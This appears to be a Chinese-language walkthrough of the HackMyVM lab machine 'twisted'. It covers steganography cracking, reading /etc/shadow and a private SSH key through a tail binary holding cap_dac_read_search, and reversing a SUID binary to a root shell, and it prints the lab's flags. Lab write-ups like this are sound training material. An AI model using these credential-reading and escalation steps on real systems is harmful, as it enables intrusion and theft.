## Nmap

先扫全端口：

```bash
┌──(kali㉿kali)-[/tmp/235]
└─$ nmap -p0-65535 --min-rate 5000 192.168.205.235
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-19 08:25 -0400
Nmap scan report for 192.168.205.235
Host is up (0.00032s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
MAC Address: 08:00:27:C3:24:40 (Oracle VirtualBox virtual NIC)
```

开放 `80/2222`，版本识别确认 2222 是 SSH。

## Web 80

首页内容：

```html
<h1>I love cats!</h1> 
<img src="cat-original.jpg" alt="Cat original"  width="400" height="400"> 
<br>
<h1>But I prefer this one because seems different</h1>
<img src="cat-hidden.jpg" alt="Cat Hidden" width="400" height="400"> 
```

页面展示两张猫图片，`cat-hidden.jpg` 注释"seems different"暗示隐写。

## Stegseek 破解隐写

下载图片后用 stegseek 暴力破解：

```bash
┌──(kali㉿kali)-[/tmp/235]
└─$ stegseek cat-hidden.jpg /mnt/hgfs/gx/x/5000q.txt -xf stegout.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "sexymama"
[i] Original filename: "mateo.txt".
[i] Extracting to "stegout.txt".
```

隐写密码 `sexymama`，原始文件名 `mateo.txt`。提示这是用户 mateo 的信息。

读取提取内容：

```bash
┌──(kali㉿kali)-[/tmp/235]
└─$ cat stegout.txt
thisismypassword
```

得到凭据 `mateo:thisismypassword`。

## SSH mateo

```bash
┌──(kali㉿kali)-[/tmp/235]
└─$ ssh -p 2222 mateo@192.168.205.235
```

```bash
uid=1000(mateo) gid=1000(mateo) groups=1000(mateo),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

读取家目录的 note。

```bash
mateo@twisted:~$ cat note.txt
/var/www/html/gogogo.wav
```

## gogogo.wav 摩尔斯码解码

下载 wav 文件分析频率与节奏，发现是标准摩尔斯码音频（长音240ms=划，短音90ms=点）：

```
--. ---   -.. . . .--. . .-. ...   -.-. --- -- .   .-- .. - ....   -- .   ...   .-.. .. - - .-.. .   .-. .- -... -... .. - ...
```

解码结果：

```text
GO DEEPER... COME WITH ME... LITTLE RABBIT...
```

兔子洞。

# Capability 提权

枚举 capability 发现：

```bash
mateo@twisted:~$ /sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/tail = cap_dac_read_search+ep
```

`tail` 具有 `cap_dac_read_search`，可以绕过文件读权限限制。

读取 `/etc/shadow`：

```bash
mateo@twisted:~$ tail /etc/shadow
mateo:$6$j5ATD8qkkcGCCU1h$...:18549:0:99999:7:::
markus:$6$kHfI3QtIBB47N75s$...:18549:0:99999:7:::
bonita:$6$8JsoW6Q5O8faA1cd$...:18549:0:99999:7:::
```

读取 markus 的 note（mateo 无权直接读）：

```bash
mateo@twisted:~$ tail /home/markus/note.txt
Hi bonita,
I have saved your id_rsa here: /var/cache/apt/id_rsa
Nobody can find it.
HMVblackcat
```

关键信息：`/var/cache/apt/id_rsa` 存放 bonita 的 SSH 私钥。

读取 bonita 的私钥：

```bash
mateo@twisted:~$ tail -n +1 /var/cache/apt/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----
```

## SSH bonita

```bash
┌──(kali㉿kali)-[/tmp/235]
└─$ chmod 600 id_rsa_bonita && ssh -i id_rsa_bonita -o StrictHostKeyChecking=no -p 2222 bonita@192.168.205.235
bonita@twisted:~$ id
uid=1002(bonita) gid=1002(bonita) groups=1002(bonita)
```

# SUID 提权

家目录下发现 SUID 文件 `beroot`。

```bash
-rwsrws--- 1 root bonita 16864 Oct 14  2020 /home/bonita/beroot
```

运行时要求输入 code：

```bash
bonita@twisted:~$ /home/bonita/beroot
Enter the code:
WRONG
```

反汇编 main 函数：

```asm
0000000000001185 <main>:
    11a5:   lea    -0x4(%rbp),%rax
    11a9:   mov    %rax,%rsi
    11ac:   lea    0xe63(%rip),%rdi       # "%d" 格式字符串
    11b8:   call   scanf@plt
    11bd:   mov    -0x4(%rbp),%eax
    11c0:   cmp    $0x16f8,%eax           # 比较 0x16f8 = 5880
    11c5:   jne    11f8 <main+0x73>
    11c7:   call   setuid@plt             # setuid(0)
    11e0:   call   setgid@plt             # setgid(0)
    11e5:   lea    "/bin/bash",%rdi
    11f1:   call   system@plt             # system("/bin/bash")
    11f8:   lea    "WRONG",%rdi
    11ff:   call   puts@plt
```

程序读入一个整数 `%d`，与 `0x16f8`（十进制 5880）比较，正确则 `setuid(0)+setgid(0)+system("/bin/bash")`。

## Root

交互式输入 5880：

```bash
bonita@twisted:~$ /home/bonita/beroot
Enter the code:
5880
root@twisted:~# id
uid=0(root) gid=0(root) groups=0(root),1002(bonita)
root@twisted:~# cat /root/root.txt
HMVwhereismycat
```

user flag：

```bash
root@twisted:~# cat /home/bonita/user.txt
HMVblackcat
```